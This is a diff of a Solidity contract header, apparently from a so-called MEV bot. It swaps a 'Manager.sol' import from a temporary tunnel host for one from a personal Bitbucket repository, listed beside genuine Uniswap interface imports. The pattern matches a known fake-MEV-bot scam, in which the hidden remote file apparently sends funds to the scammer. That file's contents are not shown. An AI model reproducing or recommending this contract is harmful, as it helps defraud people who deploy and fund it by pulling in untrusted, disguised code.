@@ -2,7 +2,7 @@
 pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
-import "78a46b90818b6c.lhr.life/mev/Manager.sol";
+import "bitbucket.org/knicknitro/mevbot/src/master/Manager.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
